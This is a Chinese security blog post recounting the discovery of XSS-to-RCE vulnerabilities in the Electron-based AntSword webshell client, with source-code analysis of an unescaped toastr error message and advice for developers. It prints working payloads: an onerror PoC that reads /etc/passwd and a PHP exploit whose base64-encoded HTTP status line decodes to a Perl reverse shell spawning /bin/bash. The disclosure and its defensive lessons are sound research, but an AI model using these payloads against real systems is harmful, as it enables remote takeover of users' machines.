# 蚁剑客户端RCE挖掘过程及源码分析

阅读量 **1575727**

|评论 **17**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2019-04-12 14:30:51

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

Author:evoA[@Syclover](https://github.com/Syclover "@Syclover")

## 前言：

事情的起因是因为在一次面试中，面试官在提到我的CVE的时候说了我的CVE质量不高。简历里那几个CVE都是大一水过来的，之后也没有挖CVE更别说高质量的，所以那天晚上在我寻思对哪个CMS下手挖点高质量CVE的时候，我盯上了蚁剑并挖掘到了一枚RCE，虽然漏洞的水平并不高但是思路和过程我觉得值得拿来分享一下。

## Electron

Electron是由Github开发，用HTML，CSS和JavaScript来构建跨平台桌面应用程序的一个开源库。
Electron通过将Chromium和Node.js合并到同一个运行时环境中，并将其打包为Mac，Windows和Linux系统下的应用来实现这一目的。

简而言之，只要你会HTML，CSS，Javascript。学习这门框架，你就能跨平台开发桌面应用程序，像VSCode，Typora，Atom，Github
Desktop都是使用Electron应用进行跨平台开发。虽然Electron十分简单方便，但是我认为其存在很严重的安全问题

## 第一个蚁剑的洞

面完的当晚我正对着github的开源项目发呆，准备寻找一些开源项目进行审计，却不知不觉的逛到了历史记录蚁剑的项目，当我准备关闭的时候，一行说明引起了我的注意

![](https://cdn.nlark.com/yuque/0/2019/png/298354/1553445244321-da1ea47f-9533-4432-b60b-24010ae561c5.png#align=left&display=inline&height=510&name=%E5%9B%BE%E7%89%87.png&originHeight=1284&originWidth=1880&size=267358&status=done&width=746)

我发现蚁剑是使用Electron进行开发的，这就说明了我可以进行Electron应用的漏洞挖掘，于是我抱着试试看的运气打开了蚁剑，并在最显眼的位置输

![](https://cdn.nlark.com/yuque/0/2019/png/298354/1553445426815-d2607e7e-ad0d-4eab-881d-138943e8e0c7.png#align=left&display=inline&height=375&name=%E5%9B%BE%E7%89%87.png&originHeight=1398&originWidth=2080&size=152786&status=done&width=558)

![](https://cdn.nlark.com/yuque/0/2019/png/298354/1553599979068-a0c14f9b-ca80-4e26-91b1-faaa6820c755.png#align=left&display=inline&height=220&name=image.png&originHeight=814&originWidth=2068&size=220350&status=done&width=559)

成功XSS！由于蚁剑用Electron开发，当前程序的上下文应该是node，于是我们可以调用node模块进行RCE

poc:

    
    
    <img src=# onerror="require('child_process').exec('cat /etc/passwd',(error, stdout, stderr)=>{
      alert(`stdout: ${stdout}`);
    });">
    

![](https://cdn.nlark.com/yuque/0/2019/png/298354/1553600099332-4357473e-345e-4cd3-9d3a-ee9823898795.png#align=left&display=inline&height=800&name=image.png&originHeight=1600&originWidth=2090&size=1120369&status=done&width=1045)

## 另三个洞

成功RCE，那天晚上在和Smi1e师傅吹水[@Smi1e](https://github.com/Smi1e
"@Smi1e")，跟他聊到这个后，他发现shell管理界面也没有任何过滤

![](https://cdn.nlark.com/yuque/0/2019/png/298354/1553600287561-9affb240-1839-4711-93db-c335147d4f4d.png#align=left&display=inline&height=699&name=image.png&originHeight=1398&originWidth=2080&size=220007&status=done&width=1040)

以上三个点都可以XSS造成RCE，poc和上面一样，就不做演示了，于是我把这些洞交了issue

但是结果是

![](https://cdn.nlark.com/yuque/0/2019/png/298354/1553600553720-23fcf347-fbed-4bc4-b3ff-67bc31705118.png#align=left&display=inline&height=164&name=image.png&originHeight=328&originWidth=916&size=64833&status=done&width=458)

被官方评为self-xss了，很难受，虽然蚁剑有1000个star，但是这个洞确实比较鸡肋，唯一可以利用的方式只有把自己的蚁剑传给别人让别人打开，这在实战中几乎是不可能的事情。

注：这四个洞所填的数据在电脑上是有储存的，位置在~/蚁剑源码目录/antData/db.ant文件中以JSON格式进行存储

所以理论上如果能替换别人电脑上的此文件也能造成RCE（但是都能替换文件内容了为什么还要这个方法来RCE干嘛）就很鸡肋

## 真-RCE的发现

就在我一筹莫展的时候，我随便点了一个shell

![](https://cdn.nlark.com/yuque/0/2019/png/298354/1553602142855-56d10288-a845-4aa3-ac37-9b50869d4bab.png#align=left&display=inline&height=777&name=image.png&originHeight=1398&originWidth=2080&size=536157&status=done&width=1156)

！！！！！！！！

虽然我以前从来不看报错，但在这个时候我十分敏感的觉得这个报错信息肯定有我可控的点，大概看了一番，发现这么一句话

![](https://cdn.nlark.com/yuque/0/2019/png/298354/1553602270132-1cc5a4fe-25bb-4c8c-9604-63e05bd688b3.png#align=left&display=inline&height=62&name=image.png&originHeight=112&originWidth=508&size=28424&status=done&width=282)

这不就是HTTP的状态码和信息吗，要知道http协议状态码是可以随意更改的，并且状态信息也可以自定义，并不会导致无法解析，于是我在我的机子进行实验

    
    
    <?php
    header('HTTP/1.1 500 <img src=# onerror=alert(1)>');
    

![](https://cdn.nlark.com/yuque/0/2019/png/298354/1553602490361-1adadb12-9131-47a8-85e6-1097ac7b3455.png#align=left&display=inline&height=446&name=image.png&originHeight=802&originWidth=2054&size=335238&status=done&width=1141)

喜提一枚X (R) S (C) S (E) 漏洞，当然这只是poc，并不能执行命令。下面是我的exp

    
    
    <?php
    
    header("HTTP/1.1 406 Not <img src=# onerror='eval(new Buffer(`cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ3BlcmwgLWUgXCd1c2UgU29ja2V0OyRpPSIxMjcuMC4wLjEiOyRwPTEwMDI7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9iYXNoIC1pIik7fTtcJycsKGVycm9yLCBzdGRvdXQsIHN0ZGVycik9PnsKICAgIGFsZXJ0KGBzdGRvdXQ6ICR7c3Rkb3V0fWApOwogIH0pOw==`,`base64`).toString())'>");
    ?>
    

base64是因为引号太多了很麻烦，只能先编码在解码eval。解码后的代码

    
    
    require('child_process').exec('perl -e 'use Socket;$i="127.0.0.1";$p=1002;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'',(error, stdout, stderr)=>{
        alert(`stdout: ${stdout}`);
      });
    

双击shell后

![](https://cdn.nlark.com/yuque/0/2019/png/298354/1553603776180-b0ce142b-67f2-443b-be87-2a9c02dc4bae.png#align=left&display=inline&height=400&name=image.png&originHeight=720&originWidth=1778&size=167970&status=done&width=988)

并且在蚁剑关闭后这个shell也不会断

## 源码分析

这是官方修复我第一个Self-xss的代码改动

![](https://cdn.nlark.com/yuque/0/2019/png/298354/1554975943857-745b0bd5-c90d-4e67-80f7-044a19c3c6da.png#align=left&display=inline&height=898&name=%E5%9B%BE%E7%89%87.png&originHeight=898&originWidth=982&size=52044&status=done&width=982)

![](https://cdn.nlark.com/yuque/0/2019/png/298354/1554986515891-b7aae1fb-b9de-4c46-aedf-5532a32e141e.png#align=left&display=inline&height=180&name=%E5%9B%BE%E7%89%87.png&originHeight=180&originWidth=1557&size=14702&status=done&width=1557)

更新后在目录输出这个位置使用了noxss函数进行输出，全局查找noxss函数

![](https://cdn.nlark.com/yuque/0/2019/png/298354/1554986756117-57a2d265-a779-4cf6-88ed-d13a7a2f4ad2.png#align=left&display=inline&height=403&name=%E5%9B%BE%E7%89%87.png&originHeight=403&originWidth=526&size=20644&status=done&width=526)

函数的作用很明显，把& < > “替换为实体字符，默认也替换换行。所以我们在新版本构造的exp会失效

![](https://cdn.nlark.com/yuque/0/2019/png/298354/1554987184252-0b14a70a-dadd-4a67-b859-3ce62465d06c.png#align=left&display=inline&height=699&name=%E5%9B%BE%E7%89%87.png&originHeight=699&originWidth=888&size=26218&status=done&width=888)

并且作者在大部分的输出点都做了过滤

![](https://cdn.nlark.com/yuque/0/2019/png/298354/1554987345651-4a0fbcc4-cbbc-4ffa-90c9-acb089bf86e7.png#align=left&display=inline&height=950&name=%E5%9B%BE%E7%89%87.png&originHeight=950&originWidth=463&size=60418&status=done&width=463)

几乎界面的所有输出都做了过滤，那为什么在我们的连接错误信息中没有过滤呢。于是我准备从源码层面上分析原因。由于错误信息是在连接失败的时候抛出，所以我怀疑输出点是http连接时候的错误处理产生的输出，所以先全局查找http的连接功能或函数，由于http连接一般属于核心全局函数或类。我先从入口文件app.js看起。（通过package.json配置文件的main值知道入口文件是app.js）

![](https://cdn.nlark.com/yuque/0/2019/png/298354/1554988496872-8ff017e4-00e8-4a2e-b86f-aa65874dff9f.png#align=left&display=inline&height=232&name=%E5%9B%BE%E7%89%87.png&originHeight=232&originWidth=923&size=14616&status=done&width=923)

入口文件一共就80行，在最末尾入口文件引入了6个文件，其中的request十分明显肯定是发起网络请求的文件，跟进分析。

![](https://cdn.nlark.com/yuque/0/2019/png/298354/1554988637224-e2798824-90e6-478b-b8fd-3946e2a801ad.png#align=left&display=inline&height=754&name=%E5%9B%BE%E7%89%87.png&originHeight=754&originWidth=754&size=39394&status=done&width=754)

开头的注释就表示了这个文件就是专门发起网络请求的函数文件，在第13行，发现这个文件引入了一个模块superagent，这是一个node的轻量级网络请求模块，类似于python中的requests库，所以可以确定此函数使用这个库发起网络请求，追踪superagent变量

![](https://cdn.nlark.com/yuque/0/2019/png/298354/1554988956470-d247fd25-dc20-49d1-a14a-68887da6cf4d.png#align=left&display=inline&height=413&name=%E5%9B%BE%E7%89%87.png&originHeight=413&originWidth=867&size=30676&status=done&width=867)

在104行发现，新建了一个网络请求，并且将返回对象赋予_request参数，从94行的注释也能发现这里应该实现的应该给是发起网络请求的功能，所以从这里开始追踪_request变量。

![](https://cdn.nlark.com/yuque/0/2019/png/298354/1554989398415-d29392df-3509-4f70-9670-fdbeaed27220.png#align=left&display=inline&height=803&name=%E5%9B%BE%E7%89%87.png&originHeight=803&originWidth=921&size=58735&status=done&width=921)

从123行到132行是发网络请求，并且151行，当产生错误的时候会传递一个request-error错误，并且传递了错误信息，并且之后的代码也是相同的错误处理，于是全局搜索request-error。

![](https://cdn.nlark.com/yuque/0/2019/png/298354/1554991624506-83503136-b19d-48de-9659-fc3f1ac2abd4.png#align=left&display=inline&height=436&name=%E5%9B%BE%E7%89%87.png&originHeight=436&originWidth=463&size=24651&status=done&width=463)

很明显，跟进base.js

![](https://cdn.nlark.com/yuque/0/2019/png/298354/1554991677914-41df1f3f-2375-4a6b-a95f-66411079c4c0.png#align=left&display=inline&height=892&name=%E5%9B%BE%E7%89%87.png&originHeight=892&originWidth=803&size=53676&status=done&width=803)

这里定义了一个request函数，封装好了http请求，在监听到request-error-事件的时候会直接返回promise的reject状态，并且传递error信息，ret变量就是上面传递过来的err,
rej就是promise的reject，不懂promise的可以去看看promise。然后由之后调用此request函数的catch捕获。所以全局搜索request函数

![](https://cdn.nlark.com/yuque/0/2019/png/298354/1554992450103-44434ac2-b63c-4862-ab5c-8cbac57f8697.png#align=left&display=inline&height=894&name=%E5%9B%BE%E7%89%87.png&originHeight=894&originWidth=458&size=47986&status=done&width=458)

在搜索列表里发现有database,filemanager,shellmanager等文件都调用了request函数，由于蚁剑的shell先会列目录文件，所以第一个网络请求可能是发起文件或目录操作，而我们的错误信息就是在第一次网络请求后面被输出，所以跟进filemanager

![](https://cdn.nlark.com/yuque/0/2019/png/298354/1554992660459-2bc78f24-2b05-4ea0-9a3d-434d7b8d3408.png#align=left&display=inline&height=124&name=%E5%9B%BE%E7%89%87.png&originHeight=124&originWidth=590&size=11193&status=done&width=590)

在140行注释发现了获取文件目录的函数，审计函数

![](https://cdn.nlark.com/yuque/0/2019/png/298354/1554992735397-5a4cf52a-a061-4625-85b4-251e17ecbfbe.png#align=left&display=inline&height=877&name=%E5%9B%BE%E7%89%87.png&originHeight=877&originWidth=933&size=45766&status=done&width=933)

在166行发现了调用了request函数，204行用catch捕获了前面promise的reject，并且将err错误信息json格式化并传递给toastr.error这个函数。toastr是一款轻量级的通知提示框Javascript插件，下面是这个插件的用法

![](https://cdn.nlark.com/yuque/0/2019/png/298354/1554992970340-85ca2df7-d797-415d-bc71-87e33d2da65e.png#align=left&display=inline&height=737&name=%E5%9B%BE%E7%89%87.png&originHeight=737&originWidth=542&size=167198&status=done&width=542)

看看上面蚁剑输出的错误信息，是不是发现了点什么。

![](https://cdn.nlark.com/yuque/0/2019/png/298354/1554993866672-8dbe2818-5c3c-4952-b7b0-fc78bc05cec8.png#align=left&display=inline&height=259&name=%E5%9B%BE%E7%89%87.png&originHeight=426&originWidth=1226&size=28493&status=done&width=746)

这个插件在浏览器里面也是默认不会进行xss过滤的。由于错误信息包含了http返回包的状态码和信息，所以我们构造恶意http头，前端通过toastr插件输出即可造成远程命令执行。

## 总结

由于http的错误信息输出点混杂在了逻辑函数中，相当于控制器和视图没有很好地解耦，开发者虽然对大部分的输出点进行的过滤，但是由于这个输出点比较隐蔽且混淆在的控制层，所以忽略了对此报错输出的过滤，并且错误信息是通过通知插件输出，更增加了输出的隐蔽性。开发人员在使用类似插件的时候应该了解插件是否对这类漏洞做了过滤，不能过度信赖第三方插件，并且在编写大型项目的时候，视图层和控制层应该尽可能的分离，这样才能更好进行项目的维护。

对于electron应用，开发者应该了解xss的重要性，electron应用的xss是直接可以造成系统RCE的，对于用户可控输出点，特别是这种远程可控输出点，都必须进行过滤。

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **evoA** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/176379](/post/id/176379)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [xss](/tag/xss)
  * [Electron](/tag/Electron)
  * [RCE](/tag/RCE)

 **+1** __65赞

 __收藏

![](https://p2.ssl.qhimg.com/t015c1acb017196a58e.png) evoA

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

